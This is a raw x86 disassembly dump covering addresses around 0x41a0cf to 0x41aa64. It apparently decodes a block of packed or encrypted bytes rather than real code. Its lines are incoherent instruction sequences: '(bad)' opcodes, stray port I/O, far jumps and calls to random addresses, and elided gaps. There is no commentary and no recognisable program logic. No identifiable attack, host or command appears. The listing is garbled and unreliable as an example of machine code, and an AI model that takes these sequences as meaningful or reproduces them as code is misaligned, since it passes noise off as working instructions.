  41a0cf:	jl     0x41a110
  41a0d1:	mov    esp,0xd881c45b
  41a0d6:	xor    eax,ecx
  41a0d8:	jno    0x41a0e9
  41a0da:	push   edx
  41a0db:	outs   dx,BYTE PTR ds:[esi]
  41a0dc:	mov    dh,al
  41a0de:	rol    BYTE PTR ds:0xff5a6c81,cl
  41a0e4:	sub    al,0xbd
  41a0e6:	dec    eax
  41a0e7:	jle    0x41a08d
  41a0e9:	pushf  
  41a0ea:	push   DWORD PTR ds:[eax]
  41a0ed:	mov    ch,0xd9
  41a0ef:	mov    ch,0xda
  41a0f1:	stc    
  41a0f2:	nop
  41a0f3:	inc    esp
  41a0f4:	mov    si,0x8fde
  41a0f8:	xor    esi,edx
  41a0fa:	(bad)  
  41a0fb:	rcl    DWORD PTR [edi-0x8fc49cb],cl
  41a101:	in     eax,dx
  41a102:	pop    ebx
  41a103:	ret    0x35c4
  41a106:	cmc    
  41a107:	repnz repnz mov esi,0x919976a
  41a10e:	inc    ebp
  41a10f:	lock ds iret 
  41a112:	push   ds
  41a113:	pop    esi
  41a114:	pop    ebp
  41a115:	stos   BYTE PTR es:[edi],al
  41a116:	xor    DWORD PTR [edx+0x13],edi
  41a119:	xchg   BYTE PTR [ebx],cl
  41a11b:	push   edx
  41a11c:	pop    edi
  41a11d:	xor    DWORD PTR ds:0xcc742927,esp
  41a123:	xchg   esi,eax
  41a124:	and    eax,0x177c6c3d
  41a129:	mov    eax,0xe307a5f0
  41a12e:	popa   
  41a12f:	jge    0x41a10f
  41a131:	or     al,0x3
  41a133:	enter  0x298a,0x0
  41a137:	scas   al,BYTE PTR es:[edi]
  41a138:	(bad)  
  41a139:	daa    
  41a13a:	sti    
  41a13b:	clc    
  41a13c:	and    DWORD PTR [eax+0x54],esp
  41a13f:	loopne 0x41a1bf
  41a141:	mov    eax,0x46eecc3f
  41a146:	(bad)  
  41a147:	out    0xe2,eax
  41a149:	pushf  
  41a14a:	aaa    
  41a14b:	fstp   QWORD PTR [edx+0x1cb6c76f]
  41a151:	inc    ebp
  41a152:	push   ds
  41a153:	push   cs
  41a154:	pop    esp
  41a155:	mov    ch,0x39
  41a157:	clc    
  41a158:	retf   0xd93b
  41a15b:	pop    edx
  41a15c:	call   0xfa237ace
  41a161:	enter  0xd484,0x60
  41a165:	and    eax,0x99d8fd96
  41a16a:	ds dec ecx
  41a16c:	xchg   ebp,eax
  41a16d:	pop    edi
  41a16e:	push   edx
  41a16f:	add    DWORD PTR [eax],ecx
  41a171:	push   esi
  41a172:	ss xchg edi,eax
  41a174:	in     eax,dx
  41a175:	dec    esi
  41a176:	and    al,0xa7
  41a178:	mov    ds:0x1acb1d25,eax
  41a17d:	cmp    BYTE PTR [esi+ecx*2+0xc],dh
  41a181:	aad    0x4
  41a183:	sub    ecx,ecx
  41a185:	shl    BYTE PTR [ebp-0x1d],1
  41a188:	xchg   ecx,eax
  41a189:	outs   dx,BYTE PTR ds:[esi]
  41a18a:	fisubr WORD PTR [bx+di-0x4703]
  41a18f:	and    al,BYTE PTR [eax]
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	inc    ebx
  41a201:	jg     0x41a1bc
  41a203:	pop    edx
  41a204:	in     al,0x14
  41a206:	add    DWORD PTR [eax],eax
  41a208:	add    al,0x1
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	push   edx
  41a20d:	sbb    BYTE PTR [ebp+edi*2+0x7876fc13],ah
  41a214:	jo     0x41a1ab
  41a216:	add    BYTE PTR [esi],dh
  41a218:	inc    edx
  41a219:	xchg   edx,eax
  41a21a:	adc    dl,dl
  41a21c:	inc    DWORD PTR [ebp-0x4a56f895]
  41a222:	push   ecx
  41a223:	andnps xmm5,xmm5
  41a226:	push   ss
  41a227:	mov    ah,0xa0
  41a229:	daa    
  41a22a:	dec    ebp
  41a22b:	ins    DWORD PTR es:[edi],dx
  41a22c:	jnp    0x41a265
  41a22e:	push   cs
  41a22f:	loope  0x41a1ce
  41a231:	in     eax,dx
  41a232:	std    
  41a233:	mov    dh,0x48
  41a235:	imul   ebx,DWORD PTR [edi],0xffffffd9
  41a238:	in     eax,dx
  41a239:	xor    dl,BYTE PTR [esi-0x4]
  41a23c:	adc    al,dl
  41a23e:	pop    edx
  41a23f:	adc    eax,0xa2a9e0b8
  41a244:	add    al,0x2e
  41a246:	fmul   DWORD PTR [edx-0x31]
  41a249:	mov    bh,0xc3
  41a24b:	inc    esi
  41a24c:	inc    eax
  41a24d:	or     eax,0xdfce7bf6
  41a252:	pop    es
  41a253:	xchg   BYTE PTR [ebx-0x56],dl
  41a256:	xor    ebx,DWORD PTR [esi]
  41a258:	dec    ebx
  41a259:	sbb    esi,0xffffff83
  41a25c:	scas   al,BYTE PTR es:[edi]
  41a25d:	adc    al,0x24
  41a25f:	xchg   edx,eax
  41a260:	sbb    eax,0xeae2e7a7
  41a265:	pop    edi
  41a266:	ror    DWORD PTR [edx],0x11
  41a269:	pushf  
  41a26a:	add    ecx,ebx
  41a26c:	cmp    esi,DWORD PTR [ecx+0x3da826d0]
  41a272:	mov    al,0xd8
  41a274:	add    cl,cl
  41a276:	ja     0x41a248
  41a278:	mov    ah,0xb2
  41a27a:	es sbb al,0xc8
  41a27d:	jl     0x41a2d0
  41a27f:	and    BYTE PTR [edi-0x2cb2c372],cl
  41a285:	(bad)  
  41a286:	push   esi
  41a287:	jae    0x41a218
  41a289:	add    bl,BYTE PTR [eax]
  41a28b:	psubb  mm7,mm4
  41a28e:	sub    eax,0x97723332
  41a293:	nop
  41a294:	xchg   ecx,eax
  41a295:	lods   eax,DWORD PTR ds:[esi]
  41a296:	sbb    ecx,eax
  41a298:	dec    edi
  41a299:	int    0x66
  41a29b:	xlat   BYTE PTR ds:[ebx]
  41a29c:	mov    eax,0x29371ccd
  41a2a1:	mov    ecx,0xee34db8a
  41a2a6:	push   0x66
  41a2a8:	stos   BYTE PTR es:[edi],al
  41a2a9:	sahf   
  41a2aa:	jmp    0x1b962942
  41a2af:	mov    eax,0x3cb3901
  41a2b4:	test   BYTE PTR [edi],cl
  41a2b6:	adc    al,0x37
  41a2b8:	stos   DWORD PTR es:[edi],eax
  41a2b9:	out    0x42,al
  41a2bb:	xor    eax,0x2bb21efa
  41a2c0:	mov    ecx,DWORD PTR [edi]
  41a2c2:	retf   0xddec
  41a2c5:	icebp  
  41a2c6:	inc    esp
  41a2c7:	cli    
  41a2c8:	(bad)  
  41a2c9:	cwde   
  41a2ca:	fwait
  41a2cb:	pop    esi
  41a2cc:	dec    ebp
  41a2cd:	and    al,0x5b
  41a2cf:	pop    ebx
  41a2d0:	(bad)
  41a2d4:	cmp    DWORD PTR [eax-0x38],0x25d241c8
  41a2db:	and    ecx,DWORD PTR [ecx]
  41a2dd:	mov    eax,ds:0xe89559dd
  41a2e2:	dec    ecx
  41a2e3:	loope  0x41a327
  41a2e5:	lock sub ecx,edx
  41a2e8:	enter  0xa7d9,0x5d
  41a2ec:	bound  esi,QWORD PTR [esi+edi*8-0x1a92a18b]
  41a2f3:	imul   edi,DWORD PTR [edi+0x77],0xffffff9d
  41a2f7:	fs inc ecx
  41a2f9:	out    dx,eax
  41a2fa:	or     ebp,DWORD PTR [bx]
  41a2fd:	mov    edi,0x1cff7504
  41a302:	adc    bl,BYTE PTR [edx-0xa82786c]
  41a308:	cli    
  41a309:	into   
  41a30a:	lock mov esp,0x1b7ac497
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	sahf   
  41a381:	jl     0x41a30e
  41a383:	outs   dx,BYTE PTR ds:[esi]
  41a384:	call   0x441a49e
  41a389:	add    DWORD PTR [eax],eax
  41a38b:	add    bh,ah
  41a38d:	fld    DWORD PTR [edi+0x73]
  41a390:	in     al,dx
  41a391:	mov    dl,0x43
  41a393:	stc    
  41a394:	std    
  41a395:	sbb    al,0x60
  41a397:	aad    0xdc
  41a399:	inc    ebx
  41a39a:	xchg   ebp,eax
  41a39b:	daa    
  41a39c:	test   DWORD PTR [edx-0x50],0x50dba658
  41a3a3:	mov    al,ds:0x5a834aba
  41a3a8:	sbb    BYTE PTR [esi-0x77],al
  41a3ab:	or     eax,0x7aa4d6f
  41a3b0:	adc    DWORD PTR [esi-0x165d6095],edi
  41a3b6:	and    BYTE PTR [edi+0x7f4377cb],ch
  41a3bc:	test   DWORD PTR [ecx-0x80],eax
  41a3bf:	jo     0x41a3a1
  41a3c1:	aas    
  41a3c2:	lds    esp,FWORD PTR [edx]
  41a3c4:	je     0x41a3f2
  41a3c6:	loopne 0x41a3fa
  41a3c8:	add    edx,DWORD PTR [edx-0x22ca4b75]
  41a3ce:	stos   DWORD PTR es:[edi],eax
  41a3cf:	pop    ecx
  41a3d0:	es loopne 0x41a3c9
  41a3d3:	fisub  DWORD PTR [eax-0x2820ce0f]
  41a3d9:	mov    al,0x35
  41a3db:	inc    ebx
  41a3dc:	or     BYTE PTR [eax-0xf],ch
  41a3df:	inc    ebp
  41a3e0:	test   BYTE PTR [edx+0x5519481c],dl
  41a3e6:	rcl    DWORD PTR [edi-0x8],cl
  41a3e9:	(bad)  
  41a3ea:	xchg   ecx,eax
  41a3eb:	arpl   WORD PTR [eax-0x51487fef],dx
  41a3f1:	cld    
  41a3f2:	jle    0x41a3b7
  41a3f4:	xchg   ebx,eax
  41a3f5:	lds    ebx,FWORD PTR [esi]
  41a3f7:	int    0x32
  41a3f9:	push   edx
  41a3fa:	in     eax,dx
  41a3fb:	imul   ecx,edx,0x1d
  41a3fe:	or     eax,DWORD PTR [esi+0x22]
  41a401:	fwait
  41a402:	retf   
  41a403:	cmp    ch,ah
  41a405:	js     0x41a40d
  41a407:	mov    al,ds:0x32583e05
  41a40c:	and    BYTE PTR [edx+ebx*4-0x71],dh
  41a410:	dec    esi
  41a411:	out    0x2c,eax
  41a413:	mov    cl,0x3e
  41a415:	dec    edx
  41a416:	lock xor al,0xc0
  41a419:	xor    edx,esp
  41a41b:	dec    esi
  41a41c:	and    eax,DWORD PTR ds:0xc801e1f0
  41a422:	ss (bad) 
  41a425:	loope  0x41a49e
  41a427:	retf   
  41a428:	inc    edx
  41a429:	push   ss
  41a42a:	xchg   edi,eax
  41a42b:	sbb    eax,0xb4a2f0cc
  41a430:	push   ecx
  41a431:	jb     0x41a474
  41a433:	(bad)  
  41a434:	xor    al,0x4a
  41a436:	jl     0x41a45c
  41a438:	mov    dl,0x30
  41a43a:	adc    DWORD PTR [eax],esp
  41a43c:	sti    
  41a43d:	xchg   edi,eax
  41a43e:	or     edi,DWORD PTR [eax-0x58]
  41a441:	jp     0x41a409
  41a443:	mov    ch,dl
  41a445:	(bad)  
  41a446:	xor    al,0x61
  41a448:	add    al,0xac
  41a44a:	inc    ebp
  41a44b:	addr16 dec ebx
  41a44d:	or     ah,BYTE PTR [edx+ebp*2]
  41a450:	sbb    dl,BYTE PTR [esi-0x4002fb22]
  41a456:	add    eax,0xd38be55
  41a45b:	loopne 0x41a431
  41a45d:	(bad)  
  41a45e:	in     eax,dx
  41a45f:	popa   
  41a460:	ins    DWORD PTR es:[edi],dx
  41a461:	xor    al,0x52
  41a463:	mov    cl,0x38
  41a465:	mov    ?,edx
  41a467:	(bad)  
  41a468:	xchg   ecx,eax
  41a469:	sub    ecx,DWORD PTR [ebx+0x33]
  41a46c:	jle    0x41a47e
  41a46e:	pop    ds
  41a46f:	sub    ebp,esi
  41a471:	jg     0x41a4b8
  41a473:	jb     0x41a407
  41a475:	jno    0x41a4dc
  41a477:	cdq    
  41a478:	mov    ah,0x59
  41a47a:	test   BYTE PTR [esi+0xe],ch
  41a47d:	jge    0x41a44c
  41a47f:	call   0xc868:0xf64fe9ab
  41a486:	jne    0x41a454
  41a488:	xor    eax,0xca21f775
  41a48d:	loopne 0x41a440
  41a48f:	pop    esi
	...
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	jns    0x41a483
  41a502:	adc    dh,BYTE PTR [edx+0x116ec]
  41a508:	add    al,0x1
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	add    cl,BYTE PTR [ebp+0x31ca8f3f]
  41a512:	retf   0xd48c
  41a515:	icebp  
  41a516:	in     eax,0xc
  41a518:	stos   DWORD PTR es:[edi],eax
  41a519:	cdq    
  41a51a:	or     dh,dl
  41a51c:	es and ecx,esi
  41a51f:	lods   al,BYTE PTR ds:[esi]
  41a520:	cmp    eax,0x4a4cb009
  41a525:	shr    edx,1
  41a527:	fnstenv [eax-0x52187606]
  41a52d:	add    DWORD PTR [edi],edi
  41a52f:	adc    bl,ch
  41a531:	push   eax
  41a532:	dec    ebx
  41a533:	into   
  41a534:	ds push ebx
  41a536:	int    0x9b
  41a538:	mov    al,al
  41a53a:	mov    ah,0x15
  41a53c:	ins    DWORD PTR es:[edi],dx
  41a53d:	lahf   
  41a53e:	adc    al,0xe8
  41a540:	mov    eax,DWORD PTR [ecx]
  41a542:	sub    al,0xc8
  41a544:	bound  ecx,QWORD PTR ds:0xde31a812
  41a54a:	adc    bl,BYTE PTR [edx+0x49ce24a4]
  41a550:	(bad)  
  41a551:	in     al,dx
  41a552:	push   ebx
  41a553:	jnp    0x41a577
  41a555:	icebp  
  41a556:	scas   al,BYTE PTR es:[edi]
  41a557:	adc    DWORD PTR [esi],0xf12b6e0d
  41a55d:	sub    ch,cl
  41a55f:	fistp  DWORD PTR [ebx]
  41a561:	jp     0x41a4f0
  41a563:	and    eax,0x55387faf
  41a568:	mov    ch,0x3b
  41a56a:	test   edi,0x5f0ed48d
  41a570:	shl    DWORD PTR [edi],1
  41a572:	jo     0x41a51f
  41a574:	in     al,dx
  41a575:	sub    al,0x4
  41a577:	jb     0x41a580
  41a579:	mov    ch,0xe1
  41a57b:	dec    edi
  41a57c:	mov    ebp,0x279ca45e
  41a581:	iret   
  41a582:	sbb    esi,DWORD PTR [esi+0x5536d093]
  41a588:	in     eax,dx
  41a589:	mov    bl,0x3d
  41a58b:	dec    ecx
  41a58c:	sub    eax,0x34b5d2fd
  41a591:	push   edi
  41a592:	bound  esi,QWORD PTR [esi-0x7e2b1eed]
  41a598:	lods   al,BYTE PTR ds:[esi]
  41a599:	and    ebx,DWORD PTR [edi+0x6bb78ea9]
  41a59f:	sbb    BYTE PTR [ecx-0x76],dl
  41a5a2:	stos   DWORD PTR es:[edi],eax
  41a5a3:	aam    0x22
  41a5a5:	in     eax,0x3e
  41a5a7:	xor    DWORD PTR [edi+0x3b],edi
  41a5aa:	sbb    bl,BYTE PTR [ecx+0x2541220d]
  41a5b0:	popa   
  41a5b1:	push   edi
  41a5b2:	lock out 0xc9,eax
  41a5b5:	pop    ebx
  41a5b6:	lods   eax,DWORD PTR ds:[esi]
  41a5b7:	icebp  
  41a5b8:	test   BYTE PTR [ebx],bl
  41a5ba:	and    eax,0x501d7c0f
  41a5bf:	jmp    0x7041a14a
  41a5c4:	out    dx,eax
  41a5c5:	inc    edi
  41a5c6:	cmc    
  41a5c7:	add    al,0x11
  41a5c9:	jnp    0x41a60b
  41a5cb:	out    dx,al
  41a5cc:	push   edx
  41a5cd:	dec    esp
  41a5ce:	retf   
  41a5cf:	pushf  
  41a5d0:	ins    DWORD PTR es:[edi],dx
  41a5d1:	test   esp,edx
  41a5d3:	adc    BYTE PTR [edx+0x3f],0x70
  41a5d7:	popf   
  41a5d8:	(bad)  
  41a5d9:	iret   
  41a5da:	jg     0x41a5b4
  41a5dc:	cmp    BYTE PTR [ecx+ebx*4],al
  41a5df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5e0:	stc    
  41a5e1:	xlat   BYTE PTR ds:[ebx]
  41a5e2:	mov    bl,0x14
  41a5e4:	inc    eax
  41a5e5:	aad    0x43
  41a5e7:	(bad)  
  41a5e8:	retf   
  41a5e9:	nop
  41a5ea:	add    ah,BYTE PTR [ecx]
  41a5ec:	cmp    bl,BYTE PTR [eax+0x2eb00dab]
  41a5f2:	inc    ebp
  41a5f3:	and    bl,0xd5
  41a5f6:	stos   DWORD PTR es:[edi],eax
  41a5f7:	jecxz  0x41a5d9
  41a5f9:	jle    0x41a5aa
  41a5fb:	xchg   esp,eax
  41a5fc:	pop    ebx
  41a5fd:	in     eax,0x50
  41a5ff:	push   ss
  41a600:	and    al,0xda
  41a602:	xlat   BYTE PTR ds:[ebx]
  41a603:	mov    dh,0xd7
  41a605:	aaa    
  41a606:	inc    esi
  41a607:	lahf   
  41a608:	xor    al,0xe0
  41a60a:	sbb    DWORD PTR [eax+0x7c],esi
  41a60d:	cmp    DWORD PTR [ecx+0x4],esp
	...
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x3e2ba625
  41a682:	outs   dx,BYTE PTR ds:[esi]
  41a683:	jmp    0x104:0x117f0
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	in     al,0xa6
  41a68e:	sbb    eax,0xc81ec07c
  41a693:	jp     0x41a630
  41a695:	and    edx,DWORD PTR [eax]
  41a697:	dec    eax
  41a698:	inc    esi
  41a699:	sub    eax,DWORD PTR [esi+0x58]
  41a69c:	imul   ecx,esi,0x2331f420
  41a6a2:	dec    ebx
  41a6a3:	dec    edi
  41a6a4:	pop    esp
  41a6a5:	mov    esi,0xec396af9
  41a6aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6ab:	jle    0x41a6fe
  41a6ad:	sbb    eax,0xf68b5e02
  41a6b2:	pop    esp
  41a6b3:	out    0x66,eax
  41a6b5:	icebp  
  41a6b6:	dec    esp
  41a6b7:	arpl   bp,ax
  41a6b9:	cwde   
  41a6ba:	aam    0x2b
  41a6bc:	fbld   TBYTE PTR [edx]
  41a6be:	adc    al,0x47
  41a6c0:	and    esi,DWORD PTR [ebx+0x2bcbfd6a]
  41a6c6:	and    DWORD PTR [ebx],esi
  41a6c8:	or     DWORD PTR [edi+ebx*1-0x4f6f5925],edi
  41a6cf:	lods   eax,DWORD PTR ds:[esi]
  41a6d0:	add    al,0x9e
  41a6d2:	adc    esp,DWORD PTR [edx]
  41a6d4:	xor    al,bh
  41a6d6:	push   edi
  41a6d7:	stos   BYTE PTR es:[edi],al
  41a6d8:	cmp    ebx,DWORD PTR [ecx-0x6dd15a01]
  41a6de:	mov    DWORD PTR [ebp+0x30283397],ebx
  41a6e4:	das    
  41a6e5:	adc    ecx,ebp
  41a6e7:	jl     0x41a6e0
  41a6e9:	add    al,0x34
  41a6eb:	dec    ecx
  41a6ec:	pop    ecx
  41a6ed:	or     BYTE PTR [ebx-0x12c39da4],al
  41a6f3:	add    ecx,ecx
  41a6f5:	ss mov eax,0xe2dfd238
  41a6fb:	(bad)  
  41a6fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6fd:	imul   BYTE PTR [edx]
  41a6ff:	jbe    0x41a6b4
  41a701:	xchg   ebp,eax
  41a702:	rcl    BYTE PTR [ebp-0x7d],cl
  41a705:	(bad)  
  41a707:	pop    ebp
  41a708:	cld    
  41a709:	loope  0x41a6f6
  41a70b:	fnsave ds:0x4b224df9
  41a711:	loope  0x41a720
  41a713:	push   0x97d779d8
  41a718:	data16 arpl WORD PTR [ebx-0x74],cx
  41a71c:	(bad)  
  41a71d:	xor    BYTE PTR [ecx+0x6a],dh
  41a720:	mov    bh,0x86
  41a722:	jmp    0xf9259e7e
  41a727:	jl     0x41a78a
  41a729:	mov    BYTE PTR [eax],0x69
  41a72c:	aam    0xda
  41a72e:	fs jle 0x41a715
  41a731:	xchg   ebx,eax
  41a732:	test   al,0xa0
  41a734:	xchg   edx,ebx
  41a736:	nop
  41a737:	call   0xbc7ad98a
  41a73c:	stc    
  41a73d:	add    edi,eax
  41a73f:	test   ecx,ecx
  41a741:	aad    0x88
  41a743:	dec    ebp
  41a744:	in     eax,dx
  41a745:	outs   dx,DWORD PTR ds:[esi]
  41a746:	jecxz  0x41a7c7
  41a748:	sbb    eax,0x790a2020
  41a74d:	lods   al,BYTE PTR ds:[esi]
  41a74e:	jno    0x41a765
  41a750:	adc    eax,eax
  41a752:	and    BYTE PTR [eax-0x57],dh
  41a755:	imul   esp,ebx,0x8c0b040
  41a75b:	ins    BYTE PTR es:[edi],dx
  41a75c:	mov    ebp,0xfd923c9
  41a761:	sub    al,0x5f
  41a763:	scas   al,BYTE PTR es:[edi]
  41a764:	push   ss
  41a765:	push   0xe
  41a767:	scas   al,BYTE PTR es:[edi]
  41a768:	leave  
  41a769:	pop    esi
  41a76a:	out    0x88,eax
  41a76c:	scas   al,BYTE PTR es:[edi]
  41a76d:	lods   eax,DWORD PTR ds:[esi]
  41a76e:	xchg   ebx,eax
  41a76f:	sub    ebp,DWORD PTR [esp+eiz*4-0x66]
  41a773:	addr16 out 0xb1,al
  41a776:	aam    0x47
  41a778:	ins    BYTE PTR es:[edi],dx
  41a779:	sbb    BYTE PTR [edi],0x6b
  41a77c:	mov    ds:0x6468435e,eax
  41a781:	inc    eax
  41a782:	(bad)  es:[edx-0x65cc27f0]
  41a789:	ret    0xf288
  41a78c:	repz mov esi,0x9c19
	...
  41a7f2:	add    BYTE PTR [eax],al
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x215327ca,al
  41a801:	dec    esp
  41a802:	push   ss
  41a803:	adc    al,0xf4
  41a805:	sbb    BYTE PTR [ecx],al
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	cld    
  41a80d:	call   0x1672:0xe97b9334
  41a814:	fisttp WORD PTR [ecx-0x76]
  41a817:	mov    ah,0x1b
  41a819:	nop
  41a81a:	in     eax,0xa3
  41a81c:	dec    DWORD PTR [ecx]
  41a81e:	cdq    
  41a81f:	int3   
  41a820:	ins    DWORD PTR es:[edi],dx
  41a821:	mov    esp,DWORD PTR [ecx+0x196ad155]
  41a827:	inc    eax
  41a828:	retf   0x6da7
  41a82b:	aad    0x7c
  41a82d:	push   ebp
  41a82e:	mov    WORD PTR [eax+0x11242ff9],fs
  41a834:	jnp    0x41a81d
  41a836:	jle    0x41a837
  41a838:	jns    0x41a7ee
  41a83a:	push   0xffffff89
  41a83c:	adc    dl,dh
  41a83e:	inc    esp
  41a83f:	pop    ss
  41a840:	int    0xae
  41a842:	mov    ds:0x8e1f6050,ax
  41a848:	add    esp,0xffffff9c
  41a84b:	sbb    al,0x9
  41a84d:	lock (bad) 
  41a850:	test   DWORD PTR [ebx+0x6b428b0e],edi
  41a856:	je     0x41a7ed
  41a858:	jbe    0x41a861
  41a85a:	xor    eax,DWORD PTR [edi-0x7d]
  41a85d:	mov    ds:0x3ab39229,eax
  41a862:	test   eax,0x11395789
  41a867:	cmp    DWORD PTR [edx-0x7e15c1fa],esi
  41a86d:	pop    ecx
  41a86e:	add    DWORD PTR [eax-0x8fbc280],ebx
  41a874:	test   DWORD PTR [esp+ebp*1-0x58693e59],ebp
  41a87b:	pushf  
  41a87c:	stos   DWORD PTR es:[edi],eax
  41a87d:	retf   0x1362
  41a880:	rcr    DWORD PTR [ebx+0x1df74e98],cl
  41a886:	push   0x31e7692e
  41a88b:	ret    0x5dbb
  41a88e:	push   ebx
  41a88f:	mov    WORD PTR [eax-0x457db136],es
  41a895:	ret    0x82fe
  41a898:	iret   
  41a899:	cmp    esp,DWORD PTR [ebp+0x7e]
  41a89c:	(bad)  
  41a89e:	xor    al,ch
  41a8a0:	jmp    0x41a89b
  41a8a2:	mov    bl,BYTE PTR [ebx-0x370b49d6]
  41a8a8:	cmp    BYTE PTR [edi+0x56315c05],cl
  41a8ae:	pushf  
  41a8af:	adc    dl,BYTE PTR [edi+ecx*4-0x1b0f6424]
  41a8b6:	xor    BYTE PTR [ebp+0x11686d23],al
  41a8bc:	imul   edx,DWORD PTR [ebx-0x2e],0x32f4bfd5
  41a8c3:	retf   
  41a8c4:	push   edi
  41a8c5:	cdq    
  41a8c6:	mov    al,0x78
  41a8c8:	and    al,0x6a
  41a8ca:	or     bh,BYTE PTR [eax-0x27]
  41a8cd:	lock inc ecx
  41a8cf:	stc    
  41a8d0:	push   eax
  41a8d1:	adc    ch,BYTE PTR [edi-0x73]
  41a8d4:	or     cl,bh
  41a8d6:	sub    bh,BYTE PTR [ecx+0x6b7541a7]
  41a8dc:	(bad)  
  41a8dd:	pop    eax
  41a8de:	mov    ebp,0xea4dad0d
  41a8e3:	jae    0x41a93d
  41a8e5:	mov    cl,0xcd
  41a8e7:	push   cs
  41a8e8:	pop    ss
  41a8e9:	call   0xaa56:0x53198f67
  41a8f0:	mov    ah,0xe2
  41a8f2:	aaa    
  41a8f3:	push   0x52
  41a8f5:	add    eax,0x5333ef83
  41a8fa:	jecxz  0x41a958
  41a8fc:	sti    
  41a8fd:	cdq    
  41a8fe:	mov    WORD PTR [esi-0x66b0110f],ds
  41a904:	cmc    
  41a905:	inc    esp
  41a906:	sub    al,0xbb
  41a908:	xchg   ecx,eax
  41a909:	aad    0xe9
  41a90b:	fadd   QWORD PTR [edx+0x93b15a]
	...
  41a971:	add    BYTE PTR [eax],al
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	cmp    eax,eax
  41a982:	xor    DWORD PTR [ebx+0x119f8],eax
  41a988:	add    al,0x1
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	mov    dl,0x54
  41a98e:	addr16 xchg ecx,eax
  41a990:	(bad)  
  41a991:	fcomp  DWORD PTR ds:0xaa29777e
  41a997:	mov    eax,ds:0x32bfcca2
  41a99c:	and    al,BYTE PTR [eax+0x53]
  41a99f:	sti    
  41a9a0:	(bad)  
  41a9a2:	jne    0x41a927
  41a9a4:	sahf   
  41a9a5:	aaa    
  41a9a6:	jmp    FWORD PTR [ebp+ecx*1-0x5617652a]
  41a9ad:	sub    al,0x11
  41a9af:	pop    esi
  41a9b0:	cmp    DWORD PTR [ebp+0x37],0x9
  41a9b4:	fcomi  st,st(6)
  41a9b6:	mov    cl,BYTE PTR [edi]
  41a9b8:	push   ecx
  41a9b9:	xchg   esp,eax
  41a9ba:	iret   
  41a9bb:	jne    0x41a976
  41a9bd:	test   BYTE PTR [edx+esi*4-0x7560efa9],dl
  41a9c4:	shl    DWORD PTR [esi],1
  41a9c6:	dec    edi
  41a9c7:	std    
  41a9c8:	dec    ebx
  41a9c9:	jg     0x41a979
  41a9cb:	out    0x2e,eax
  41a9cd:	inc    eax
  41a9ce:	dec    eax
  41a9cf:	add    DWORD PTR [eax-0x5d],edi
  41a9d2:	enter  0xd1ed,0x26
  41a9d6:	or     DWORD PTR [eax+ecx*8],0x3c
  41a9da:	sti    
  41a9db:	out    0xf2,al
  41a9dd:	ja     0x41a9e0
  41a9df:	in     eax,0x9d
  41a9e1:	loopne 0x41aa21
  41a9e3:	in     eax,dx
  41a9e4:	sbb    bl,bl
  41a9e6:	push   ds
  41a9e7:	ret    0x6ecb
  41a9ea:	pop    es
  41a9eb:	jbe    0x41a9cf
  41a9ed:	pushf  
  41a9ee:	fsub   QWORD PTR [edx-0x65de0f26]
  41a9f4:	mov    ecx,0xdc3600
  41a9f9:	arpl   WORD PTR [edx],di
  41a9fb:	pop    ss
  41a9fc:	and    BYTE PTR [ebx],0x86
  41a9ff:	(bad)  
  41aa00:	push   ds
  41aa01:	mov    edi,0x4f2018d6
  41aa06:	xchg   ecx,eax
  41aa07:	jl     0x41a9c7
  41aa09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa0a:	mov    ch,0xe6
  41aa0c:	push   es
  41aa0d:	mov    BYTE PTR [edx],bh
  41aa0f:	sub    eax,esp
  41aa11:	cmp    dh,BYTE PTR [eax+0x63]
  41aa14:	xchg   esp,eax
  41aa15:	dec    esp
  41aa16:	inc    eax
  41aa17:	arpl   WORD PTR [eax],di
  41aa19:	xchg   ecx,eax
  41aa1a:	mov    al,0x2a
  41aa1c:	add    edi,edx
  41aa1e:	inc    esi
  41aa1f:	mov    ch,BYTE PTR [ebx+0xe5db74c]
  41aa25:	xor    cl,BYTE PTR [edx]
  41aa27:	sti    
  41aa28:	movhps QWORD PTR [ecx],xmm5
  41aa2b:	jne    0x41aa70
  41aa2d:	(bad)  
  41aa2f:	xchg   ebp,eax
  41aa30:	pop    ds
  41aa31:	sub    BYTE PTR [edi],al
  41aa33:	lds    edx,FWORD PTR [edi-0x5593cc93]
  41aa39:	jle    0x41aa11
  41aa3b:	test   al,0xa3
  41aa3d:	mov    esp,0x18d7a264
  41aa42:	sub    DWORD PTR [ecx+0x306ab0ad],ebx
  41aa48:	sbb    al,0x9f
  41aa4a:	fistp  DWORD PTR [ecx]
  41aa4c:	inc    ebp
  41aa4d:	pop    edi
  41aa4e:	lock xor eax,0x36a3fc39
  41aa54:	push   0xf72b3d5c
  41aa59:	mov    ds:0xe3f19f1e,eax
  41aa5e:	cmp    bl,BYTE PTR [edx+esi*1]
  41aa61:	fs iret 
  41aa63:	inc    eax
  41aa64:	xchg   esp,eax
